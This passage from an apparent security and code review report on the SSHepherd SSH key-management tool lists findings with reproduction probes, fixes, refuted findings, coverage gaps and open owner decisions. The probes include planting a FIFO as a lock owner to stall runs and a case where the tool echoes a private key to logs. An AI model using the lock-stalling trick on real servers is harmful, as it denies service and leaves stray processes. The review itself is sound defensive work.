**Evidence** (verbatim from the finding):

~~~~text
Shell: lockedReadCmdFor with a planted lock dir: plain dir -> `sshepherd-lock <now>`, rc=47 at once; owner is a FIFO -> blocked until killed (rc=142 after a 5 s alarm), and an orphaned `head -n 1 .../owner` stayed alive after the shell died. Hermetic test (FleetWriter + sshtest.ShellHandler, SessionBudget 4s): plain lock -> after 100ms refusal=true *LockedError; FIFO owner -> after 4s refusal=false, kind="agent", err=`connection dropped; the file is in an unknown state (previous version at ~/.ssh/authorized_keys.sshepherd.bak) — run sshepherd audit`, file untouched.
~~~~

**Impact:** A clear 'another apply holds the lock' refusal with its removal command becomes a long, uninterruptible stall and a misleading 'unknown state, previous version at .bak' report although nothing was touched; leaks a blocked process per attempt on the server. Needs write access to the target's directory.

**Fix direction:** Read the record only from a regular, non-symlink file and bound the read by bytes: `if [ -f "$l/owner" ] && [ ! -L "$l/owner" ]; then head -c 200 "$l/owner" | head -n 1; fi`; add FIFO and symlink rows to the lock tests.

#### G035 [low] KEY classification sends some .pub paths and pasted MD5 output to the key-line parser, so they fail with 'quote the whole line'

- **Status:** UNVERIFIED
- **Lens(es):** gap-revoke-rotate-cmd-and-keyarg (raw ids: K6-4)
- **Location:** cmd/sshepherd/keyarg.go:110-124 (looksLikeKeyLine: any space or tab, or strings.HasPrefix on a key-type name), keyarg.go:86 (MD5 only as a prefix)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probes: `--key "my keys/alice.pub"` (and the absolute path) -> `error: --key: not a valid public key line: parse authorized_keys line: ssh: no key found; … quote the whole line`; `--key ssh-ed25519-alice.pub` (an existing file) -> the same error, although the comment at keyarg.go:41-44 promises 'whole type names, so a path like ssh-keys/alice.pub … is not mistaken'; `--key "$(ssh-keygen -l -E md5 -f bob.pub)"` (`256 MD5:07:c0:… bob (ED25519)`) -> the key-line parse error instead of the MD5 refusal at :87.
~~~~

**Impact:** A real .pub cannot be named by its path, and the error says to quote a key line, which points the wrong way. Exit 3 and nothing changed (fail-safe). The workaround is to copy the file or pass the fingerprint.

**Fix direction:** Match the key type as a whole token (HasPrefix(arg, p+" ") or an exact first field), and try the path when the argument names an existing file before parsing it as a line. Treat a token starting with `MD5:` anywhere in the argument as the MD5 refusal. Add the three cases to the classification table test.

#### G036 [low] Public keys in non-OpenSSH formats get wrong refusals: a PKIX public key is called 'a private key', and an RFC 4716 public key 'holds 4 key lines'

- **Status:** UNVERIFIED
- **Lens(es):** gap-revoke-rotate-cmd-and-keyarg (raw ids: K6-5)
- **Location:** cmd/sshepherd/keyarg.go:224-236 (isPrivateKey: any first line starting with -----BEGIN), keyarg.go:196-204
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
`ssh-keygen -e -m PKCS8 -f carol.pub > carol.pkix.pub` (first line `-----BEGIN PUBLIC KEY-----`); `revoke --key carol.pkix.pub` -> `error: --key carol.pkix.pub is a private key — pass the public key (carol.pkix.pub.pub)`. `ssh-keygen -e -f alice.pub > alice.rfc4716.pub` (`---- BEGIN SSH2 PUBLIC KEY ----`, the default PuTTYgen public format) -> `error: --key alice.rfc4716.pub: holds 4 key lines — want exactly one`. A .pub symlinked to a private key is refused correctly, but its hint says `(alice-link.pub.pub)`. <!-- gitleaks:allow (probe output, not a secret) -->
~~~~

**Impact:** Fail-safe (exit 3, nothing quoted), but telling an operator a public key file is private, and to pass FILE.pub.pub, sends them the wrong way during an incident. PuTTY users hit the RFC 4716 case with their normal public key file.

**Fix direction:** Check for PRIVATE KEY / PuTTY-User-Key-File only, and recognize `-----BEGIN PUBLIC KEY-----` and `---- BEGIN SSH2 PUBLIC KEY ----` with the message 'not in OpenSSH format — convert with ssh-keygen -i -m PKCS8|RFC4716 -f FILE'. Do not append .pub when the argument already ends in .pub.

#### G037 [low] A FIFO (or another blocking special file) as KEY hangs before the manifest is read, and the first Ctrl-C is ignored

- **Status:** UNVERIFIED
- **Lens(es):** gap-revoke-rotate-cmd-and-keyarg (raw ids: K6-6)
- **Location:** cmd/sshepherd/keyarg.go:58-69 (readKeyFile: os.Open + io.ReadAll with no file-type check and no ctx)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
`mkfifo fifo.pub; sshepherd revoke --config m.yaml --no-apply --dry-run --key fifo.pub &`, SIGINT after 2 s -> `still running after one SIGINT`; a second SIGINT -> `exit=130`, with no output. watchSignals' first signal only cancels ctx, which a blocking open(2) never sees.
~~~~

**Impact:** Minor. The command hangs silently with no prompt or message, and the documented 'first Ctrl-C cancels' does not apply.

**Fix direction:** Stat (or open with O\_NONBLOCK and fstat) and refuse anything that is not a regular file, as keyfile does for --identity, with 'not a regular file — pass a .pub file'.

#### G038 [low] A private key pasted as a revoke USER argument is echoed whole to stderr

- **Status:** UNVERIFIED
- **Lens(es):** gap-revoke-rotate-cmd-and-keyarg (raw ids: K6-7)
- **Location:** cmd/sshepherd/revoke.go:121 (`%s looks like a key — did you mean --key?` prints the argument verbatim); cobra's `bad flag syntax: %s` for an argument starting with '-' (no FlagErrorFunc in newRootCmd)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
`sshepherd revoke --config m.yaml --no-apply --dry-run "$(cat alice)"` (alice is an OpenSSH private key, 399 bytes) -> 423-byte stderr: `error: bad flag syntax: ` followed by the whole private key (header and body; redacted in this report), including `END OPENSSH PRIVATE KEY` (grep -c = 1). `revoke … -- "$(cat alice)"` -> `error: ` + the whole private key + ` looks like a key` (redacted in this report), also with the full key. The --key/--old/--new paths do not echo it (`--key "$(cat alice)"` -> generic `not a valid public key line`, 0 key bytes in output).
~~~~

**Impact:** The private key ends up in CI logs or terminal scrollback. This is operator error, but the tool otherwise takes care never to quote key material (spec: errors never quote file contents), and that care does not cover this path.

**Fix direction:** In checkUserArgs, name a key-looking argument by a short prefix or its kind ('a private key', 'a key line'), never verbatim, and refuse an argument containing PRIVATE KEY with the private-key message. Set a FlagErrorFunc that truncates or redacts the offending argument.

#### G039 [low] Follow-up hints are not paste-ready for a user name starting with '-'

- **Status:** UNVERIFIED
- **Lens(es):** gap-revoke-rotate-cmd-and-keyarg (raw ids: K6-8)
- **Location:** cmd/sshepherd/editrun.go:667-682 (hintArg: shellSafe allows a leading '-', and no '--' is added); config allows such names (internal/config/config.go:211 checks only RenderTextIssue)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Manifest user `-bob`: `revoke --key bob.pub --dry-run --no-apply` prints `note: -bob has no keys left — 'sshepherd revoke -bob --config m3.yaml' removes the user`. Pasting it -> `error: unknown shorthand flag: 'b' in -bob`, exit 3. `sshepherd revoke --config m3.yaml --no-apply --dry-run -- -bob` works (`manifest edit: remove user -bob`).
~~~~

**Impact:** CLAUDE.md promises paste-ready hints. Here the pasted hint fails with exit 3, harmless but wrong. Adopt's sanitizeName never makes such names, so only hand-written names are affected.

**Fix direction:** Have the hint builder put `--` before positional arguments when one starts with '-', or reject user names with a leading '-' at load (as server names reject '@').

#### G040 [low] depguard 'transport' globs do not reach internal/sshconn/sshtest (the test server every transport test imports), and make layering checks only non-test deps, so nothing stops sshtest from importing the domain

- **Status:** UNVERIFIED
- **Lens(es):** gap-verify-unverified-and-split-claims (raw ids: K8-4)
- **Location:** .golangci.yml:115-131 (files: "\*\*/internal/sshconn/\*.go", "\*\*/internal/sshread/\*.go", "\*\*/internal/sshwrite/\*.go"); Makefile:110 (transport=$(go list -deps ./internal/sshconn ./internal/sshread ./internal/sshwrite))
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Mutation script in my worktree (blank import of internal/audit added after the package clause, restored by git checkout in a trap EXIT), then golangci-lint v2.15.0 run --enable-only depguard: internal/sshconn/sshtest/sshtest.go -> '0 issues.'; control internal/sshconn/sshconn.go -> 'import 'github.com/javadh75/SSHepherd/internal/audit' is not allowed from list 'transport': transport must not import audit; shared types live in internal/fleet (depguard)'. go list ./... shows sshtest is the only nested package under a layered directory. make layering lists -deps of the three transport packages, which do not include sshtest (a test-only import), and CLAUDE.md claims 'The rules cover test files too, with no exclusions' and that 'the sshwrite integration test no longer imports audit'.
~~~~

**Impact:** The ARC-8 promise that transport tests never pull in the domain (the reason OfferRank moved to authkeys) has a hole: the shared test server can import audit/apply/workflow, and every sshconn/sshread/sshwrite test then links the domain, with no gate failing. Nothing violates it today (sshtest imports only keyfile in-repo).

**Fix direction:** Add "\*\*/internal/sshconn/\*\*/\*.go" (or an explicit sshtest glob) to the transport rule, and add ./internal/sshconn/sshtest to make layering's transport list.

## 5. Refuted

### G003 [high] revoke exits 1, not 2, when it leaves the key it just revoked installed on a sole-grantee (emptied) server it read

- **Location:** internal/apply/plan.go:236-258 (planNoGrants -> ClassRefused), internal/apply/plan.go:812-824 (ExitCode), cmd/sshepherd/editrun.go:635; pinned by cmd/sshepherd/revoke\_test.go:382 TestRevokeSoleGrantee and revoke\_server\_test.go:225
- **Votes:** correctness: REFUTED (sev none) | reproduce: reproduced (sev medium) | security: REFUTED (sev low)

Why refuted (verbatim from the verdicts):

- **correctness** (REFUTED): The behavior is real (revoke bob --yes exits 1 and leaves bob's tombstoned key on the sole-grantee server db-1), but it is what the owner-decided spec and the README specify, so it is not a defect. Revocation-memory spec section 8 (the one shared D28 table) gives revoke/rotate exit 2 only for '--sweep found a revoked key still installed' and exit 1 for 'not converged'. D3 (owner, final) chose that removal is checked 'Only with --sweep; otherwise print the exact sshepherd audit command (with D2, a scheduled audit already pages on a revoked key)'. The same spec lists 'No wipe/empty-server mode. A sole-grantee server stays a by-hand fix and the sweep says so' under on-hold interactions. The README exit table puts refused servers in row 1 for revoke ('Not converged, unproven, as for apply') and row 2 only 'As for apply, or --sweep found a revoked key still installed'. README Limitations says 'A server is never emptied ... that server is refused, and the key stays installed'. The run also prints a header warning: 'db-1 would have no granted keys — apply never empties a server, so bob's key stays installed there'. TestRevokeSoleGrantee pins exit 1 on purpose. The finding's fix direction says to document it as deliberate, and that is already done. The general wording of D28 ('a revoked key is still installed and was seen') is made concrete by the section 8 table and D3, which the owner approved. Reopening that question would be a new owner decision, not a correctness bug.
- **reproduce** (reproduced): Reproduced: same fleet state, `revoke bob --yes` exits 1 while `--sweep` exits 2 and a follow-up `audit` exits 2 (REVOKED, critical). The run read db-1 in phase 1 (REFUSED: 1 key installed) and tombstoned that key in the same run. Not refuted: the D28 owner answer (revocation-memory spec l.134) defines exit 2 for every command as 'a revoked key is still installed and was seen', and here it was seen. Mitigations lower the severity from high to medium. The detailed D28 table (spec section 8, l.577) and the README exit table give revoke/rotate exit 2 only for '--sweep found a revoked key', and refused servers are 1 'as for apply'. D3 made the check opt-in. README Limitations (l.2740) says the emptied server is refused and the key stays installed. The run warns in the header before connecting and prints the `check every server: sshepherd audit` command, which exits 2. TestRevokeSoleGrantee pins exit 1 on purpose. So this is a gap between the D28 principle and the table as implemented. It is not an undocumented bug, and the owner should decide it. The asymmetry also covers other refused affected servers that still hold the revoked key (e.g. a restriction-clash refusal), not only emptied ones.
- **security** (REFUTED): The behavior is real (TestRevokeSoleGrantee passes: exit 1, db-1 keeps bob's key) but it is the documented owner design, not a defect. D3 (revocation-memory spec l.138) decided post-revoke checking is opt-in via --sweep, and the D28 table (same spec l.577, README Exit codes l.3142ff) scopes revoke/rotate exit 2 to '--sweep found a revoked key still installed'; otherwise revoke exits 'as for apply', where a refused server is 1. README Limitations (l.2740) states explicitly: 'A server is never emptied ... that server is refused, and the key stays installed', and the run prints 'warning: db-1 would have no granted keys — apply never empties a server, so bob's key stays installed there' at the head of the report. The root cause (no wipe/empty-server mode) is an on-hold owner item in rules.md. The same exit-1 treatment applies to every other way revoke leaves a key behind (unreachable, failed, refused by serial/conflict), so the sole-grantee case is not singled out. Mitigations: the printed 'check every server: sshepherd audit ...' command and any scheduled audit exit 2 (D2) on the tombstoned key. The finding's own fix\_direction offers documenting it as deliberate, which is already done. Residual: an owner may want exit 2 when the run itself read the key on a server (a UX/policy improvement), hence low, not high.

In short: the behavior is real, but it is the owner-approved design (spec, README and a pinned test say so). Changing it is an owner decision; the question is in section 7.

### G019 [medium] Offboarding a user who is the only grantee of every server they reach saves nothing: no tombstone, the user stays, and the message gives a fix that cannot work

- **Location:** internal/apply/predicates.go:27-38 (NothingCanLand counts an emptied server's ClassRefused as a blocking refusal); cmd/sshepherd/editrun.go:321-324
- **Votes:** single: REFUTED (sev low)

Why refuted (verbatim from the verdicts):

- **single** (REFUTED): The behavior is real (probe reproduced: revoke bob whose only server db-1 is sole-grantee -> exit 1, manifest byte-identical, no revoked: entry), but it is the spec'd, documented and tested 'Nothing can land' rule, not a defect. revoke-rotate spec section 6 (locked): 'Nothing can land - no affected server is change-planned or converged, and at least one is refused - means no prompt, nothing saved, exit 1: nothing saved - alice still has access on N servers; fix the refusals and re-run, or record the change without touching servers with --no-apply'. README 2549-2551 states it for users ('When no affected server can converge (every one refused), nothing is saved and the run exits 1 without a prompt'), and TestRevokeNothingCanLand / TestNothingCanLand pin it. Only weak-key and clash refusals were made save-neutral, each by explicit owner decision (OP4/OP6); emptied-server refusal was not, and 'apply never empties a server' is a locked decision with wipe mode on hold. The finding's headline claim that the message 'gives a fix that cannot work' is false: the header warning printed in the same run names the fix ('grant another user (or an operator) on db-1 first, or remove the key by hand'); my probe removed the key by hand and re-ran the same revoke: db-1 converged, manifest saved with the revoked: tombstone, exit 0. --no-apply also records it. The operator is never silently misled (exit 1 plus an error naming both ways out). Making this refusal save-neutral is a feature/design request for the owner, not a bug. Residual (low): the README Limitations bullet 'A server is never emptied' does not say that when every affected server is sole-grantee the whole edit is withheld, and the stderr error is generic rather than naming the by-hand fix.

In short: the behavior is real, but it is the owner-approved design (spec, README and a pinned test say so). Changing it is an owner decision; the question is in section 7.

Also refuted, one vote only (the finding survived): F005, correctness verifier, "by design" (see F005 in section 2).

## 6. Not covered

From the critic: "Every lens left the same blind spot: none of them ran make integration on alpine, debian or rocky." The gap round closed this: K3 ran it on all three distros at 9722c42 (rc=0, 118 PASS each). Gap lenses run: manifest-store-and-editor, keyfile-private-key-handling, real-sshd-integration-and-scripts, remote-posture-lock-probe-header, preserve-external-keys, revoke-rotate-cmd-and-keyarg, import-pipeline-sshcfg-reconcile-f1, verify-unverified-and-split-claims. Gap lenses dropped: none.

Per main-round lens (verbatim from not-covered.json):

- **ssh-crypto:** I did not test agent destination-constrained keys (ssh-add -h). x/crypto does not send session-bind, so such keys likely fail at signing yet still count as held for the guard; this is unproven. I did not exercise AuthenticationMethods partial success against the session-key recorder, and I did not run make integration. I did not test the probe against a noisy ~/.bashrc writing to stdout (it looks fail-safe: it rolls back) or MaxAuthTries with many survivors against real sshd. Posture, the write script and PathAssign belong to other lenses and I did not review them.
- **injection:** sshcfg (ssh\_config import) parser differentials against ssh -G beyond reading the warning-to-YAML-comment path. The FuzzLoad, FuzzWriteCmds, FuzzManifestEdit and FuzzRemoveAccess oracles were not read in depth. Bastion through-hop hints beyond keyscanCompareCmd. Whether a preserve command: rule should also require forwarding restrictions on kept lines (a design question, not a confirmed injection). The JSON output paths were spot-checked only (they rely on sanitize.Remote/clean). make integration was not run: real-sshd evidence came from the local OpenSSH 10.5p1 sshd, not the alpine/debian/rocky containers.
- **write-path:** I did not run make integration (real sshd on busybox, debian or rocky) because both findings reproduce through seams and real local shells, and busybox ash is not installed locally. I did not run mutation testing on the write scripts. Not examined in depth: second-Ctrl-C (exit 130) abandonment beyond its documented warning, plain apply saving a serial bump when Ctrl-C lands between the re-list and the commit (an edit run checks ctx there, plain apply does not; low impact, not reproduced), verify failing after a landed write (the login check is skipped and the run exits 1), and a forced command= answering a restore that runs over a reconnect (contrived). I treated the probe exec timeout counting as REJECTED, which can roll back and reinstall revoked keys on slow PAM sessions, as a documented design choice; it exits 2 when a revoked key comes back.
- **concurrency:** No real-sshd integration run (make integration). The findings are transport-level and reproduced hermetically. Not probed: known\_hosts or --identity paths that are FIFOs with no writer (open blocks the main goroutine; only the second Ctrl-C exits, a misconfiguration-only case), the abandoned /dev/tty read goroutine on darwin after a canceled passphrase prompt (followed by exit 3), and probeForward treating a forward that times out as success (a design choice per spec S5). Not fully run 50x: the whole sshconn package including fuzz seeds, and sshwrite (10x).
- **access-model:** Did not run make integration (real sshd) and did not run mutation tests. Did not deeply review manifest.RemoveAccess/RemoveUser edit output for selector entries (left to FuzzRemoveAccess), import -o --force freshDrops (F1), validate's editor-refusal checks, or the --json renderings of each command for these combos. Did not test import --merge re-adding a server named by a D1e-ignored access tombstone under a user's "\*" entry (by reading, the save is refused as 'would keep 1 policy conflict', a refusal worded as if the conflict already existed; not reported). Cosmetic: the D1c date in classifyPairs comes from the last server checked, not the latest tombstone; not reported.
- **contract-docs:** I did not verify the full CLAUDE.md Status narrative claim by claim (only a sample of counts and rules). Apply/revoke JSON field placement was checked by name, not per struct path. Exit 2 paths that need real sshd (lockout\_unrestored, post-write host-key change) were not run; I relied on code reading and the existing tests. The README Authentication/CI recipes and Development sections were not checked. I did not run integration or E2E tests.
- **test-quality:** I did not run make integration, so none of the survivors were checked against real sshd. By grep, the integration suite has no planted-.bak/temp case either. I did not mutate the lock prologue scripts, createDirs/AncestorWalk (the W5 run covered 178 write-failure mutants there) or sshconn's handshakeKind. Plan tables that say 'run the named test' (no -run regex) were not checked, nor were plan commands outside the mutation tables. Weak fuzz oracles judged not worth a finding: FuzzMatchGlob (crash-only), FuzzExpand and FuzzParseLine (minimal property, parsing delegated to x/crypto). I could not confirm whether the GitHub ubuntu runner has busybox, so I cannot say whether the busybox row of the unit shell matrix runs in CI; integration on alpine covers busybox anyway.
- **architecture:** - I did not measure function length (only cyclomatic complexity) or run the `dupl` linter at a lower threshold.
  - I did not do a full naming audit of every Operator vs IsProtected use in reconcile and import. I only spot-checked operatorGate, clearEmptiedOperators, the JSON tier flags and accessProblems.
  - I did not mutation-test the depguard globs for subpackages (the globs cover `*.go` in one directory only), or check whether the sanitize/naming leaves should be stdlib-only (they have no rule).
  - I did not trace whether the audit exit-2 rule for a host-key alarm at a bastion and apply's exit-1 rule for the same case are both intended. That belongs to another lens.
  - I did not run `make integration`; nothing I found needed a real sshd.
- **supply-chain:** Did not push anything, so the tag-bypass and PR squash-merge behaviour under the current ci-ok rule (L09-2, L09-3) rest on API readbacks and history, not a live push. Did not run shellcheck over the run: scripts (not installed). Did not audit scripts/integration.sh or docker-gates.sh line by line. Did not verify that every action SHA matches its version comment upstream, and did not check whether cosign-installer verifies the downloaded cosign binary. Did not check whether Dependabot bumps the '# syntax=' directive. Did not run trivy/dockle locally. Did not compare darwin-specific stdlib symbols for vulnerability coverage beyond the third-party package-set diff.
- **container:** Did not run trivy image or trivy config locally (they need a network database download; CI is green). Did not build or gate the amd64 variant locally, check bit-for-bit image reproducibility across builds, or verify GHCR package visibility (needs read:packages, so L10-3 stays PLAUSIBLE). Did not exercise docker stop during an in-flight remote write, including how remote locks behave when SIGKILL lands mid-write. The image SBOM is unsigned and release binaries ship no SBOM; I judged that a minor gap and did not report it.
- **performance:** I did not measure real-sshd fan-out at scale, the cost of fresh bastion handshakes, or agent-socket contention at p=32 (no integration run). I did not benchmark apply.Execute write throughput through bastions, the JSON/text report rendering cost at scale, or the import (sshcfg Include) cost with thousands of hosts. The stale comment in bench\_test.go about "production defaults (30s timeout, p=10)" is not reported because it is a nitpick.
- **product:** I did not test against a live sshd, so the host\_key\_unknown, auth and posture hints were read in code, not seen in a real run. I did not run the Docker Desktop macOS agent-socket case. I did not check that every README sample matches its golden byte for byte; I spot-checked only a few strings. I did not check the image OCI license labels produced by metadata-action, or GHCR package visibility, because the token lacks read:packages. I did not review the --help text of every flag for clarity, or the long Safety model and audit sections in depth.

## 7. Owner decisions

One line each: finding id, then the question with its options (verbatim from the findings).

- **F001** [high, CONFIRMED]: a host certificate refused because its CA or its key is @revoked: classify as host\_key\_revoked (exit 2, like a plain @revoked key, recommended) or keep it under 'an invalid certificate from a vouched CA' (host\_key, exit 1)?
- **F005** [high, CONFIRMED]: the spec (S7 table) and README say a revoke's apply phase refuses clashed servers; should a removal-only write on a clashed server proceed as it does for a weak-key server (OP4), or keep refusing and only fix the misleading hints?
  - restated by K8-3: should a restriction clash keep holding a server for a removal-only revoke of another user (keep the S7 rule and only fix the hint), or get the same removal-only exception weak keys have?
- **F006** [high, CONFIRMED]: for an unattended apply from a read-only or ephemeral manifest, should apply (a) warn and write without the bump as for a piped --config, (b) refuse unless a flag acknowledges the missing bump, or (c) stay as is with recipes rewritten to require committing the bump back (serial pre-bumped in the git change)?
- **G002** [high, CONFIRMED]: should a preserve: rule keep only lines that cannot forward (refuse/flag otherwise), only flag forwarding-capable kept lines on bastions, or stay as is with a README warning?
- **G003** [high, REFUTED] (finding refuted as a bug; still a design question): should a revoke that leaves its own revoked key installed on an emptied server exit 2 (as --sweep and audit do), or stay exit 1 with the warning (documented as deliberate)?
- **F007** [medium, CONFIRMED]: fix by (a) judging forwarding on the first survivor in OfferOrder, refusing otherwise, or (b) ordering a bastion's offer so forwarding-capable keys come first (changes OfferOrder, which D31 says is one order for every connection and the probe)?
- **F010** [medium, CONFIRMED]: for a write over an absent file, should .bak be cleared/renamed (option A) or should only the messages and README change to say there is no previous version (option B)?
- **F017** [medium, CONFIRMED]: Accept tip-only gating and reword CLAUDE.md, or enforce per-commit runs (one-commit pushes or per-commit preflight) and turn off squash/rebase merges in the repo settings?
- **F018** [medium, CONFIRMED]: Make v\* tags truly immutable (a separate no-bypass ruleset for update/delete plus immutable releases), or keep the admin bypass and change the README recovery text to say immutability is by discipline?
- **F019** [medium, CONFIRMED]: Replace the stripped binary scan with an unstripped-twin or per-GOOS source-mode scan (precise and strict), and should publish also need binaries so the image and binaries ship together or not at all?
- **F022** [medium, CONFIRMED]: which private channel to publish (GitHub private vulnerability reporting, a security email, or both) and what versions are supported before 1.0?
- **G005** [medium, CONFIRMED]: should sshcfg emulate ssh's second pass against HostName when CanonicalizeHostname is set, or only warn that the host may resolve differently?
- **G006** [medium, CONFIRMED]: should the F1 --force warning also cover key-line options and per-grant options: (one more manifest\_settings\_dropped row), or should README just state they are dropped silently?
- **G014** [medium, CONFIRMED]: should command: patterns be refused when they can match shell metacharacters (syntax-tree check), checked with prefix-derived probes, or only warned about in the README?
- **G015** [medium, CONFIRMED]: when a key is kept by preserve: on one server and plain on another, should adopt skip it, adopt it with a warning, or adopt it and never extend it to the preserve server?
- **G016** [medium, CONFIRMED]: should SSHepherd only explain penalty drops (hint plus README), or also change its fan-out (per-host serialization, or reading accounts that may fail last) to avoid triggering them?
- **G019** [medium, REFUTED] (finding refuted as a bug; still a design question): should a never-wipe (emptied-server) refusal stop a revoke from saving, or should it be save-neutral like weak-key and restriction-clash refusals?
- **F029** [low, UNVERIFIED]: keep the built-in `completion` command (document it in README and exempt it from the --json rule) or disable it?
- **F030** [low, UNVERIFIED]: should adopt's documented exit-3 causes keep the defensive 'add a restriction conflict' refusal (and README:1785 be softened), or should it be dropped from the footer and exit table as unreachable for adopt?
- **F035** [low, UNVERIFIED]: should remote-text sanitizing (sanitize.Remote, clog) also drop U+2028/U+2029 the way manifest validation (IsUnsafeRune) does, or keep them, with a comment saying why the two differ?
- **F039** [low, UNVERIFIED]: Enforce SHA pinning (and an allow-list of action owners) in the repo's Actions settings, or keep pinning as a reviewed convention?
- **F040** [low, UNVERIFIED]: make ghcr.io/javadh75/sshepherd public before the first tag, and add an anonymous-pull check to publish (yes/no)?
- **F044** [low, UNVERIFIED]: should the first release's notes be framed as an initial release (no upgrade notes) or as upgrade notes for master users, and should per-slice history move to a CHANGELOG?
- **F045** [low, UNVERIFIED]: does the project accept outside contributions now (and under DCO, CLA or neither), or should CONTRIBUTING say contributions are not yet accepted?
- **G022** [low, UNVERIFIED]: on a same-name host whose route differs, should merge only warn (manifest kept, grants still extended) or treat it like OP7's other-route case (warn and not extend grants)?
- **G023** [low, UNVERIFIED]: should SIGQUIT keep Go's goroutine dump with exit 2 (colliding with D28's security-alarm code) or be handled like SIGTERM (first cancels with exit 3, a second exits 131)?
- **G028** [low, UNVERIFIED]: should a removed entry's directly attached head comment move to the next entry (today: keeps section headings, re-labels survivors) or be dropped with the entry the way key comments are (or only blank-line-separated headings kept)?
- **G030** [low, UNVERIFIED]: should the sshd package version be pinned (reproducible, needs manual bumps), or only logged (always latest within the pinned distro)?
- **Re-rates** (gap round K8): accept F025 low -> medium, F037 low -> medium, F005 high -> medium?

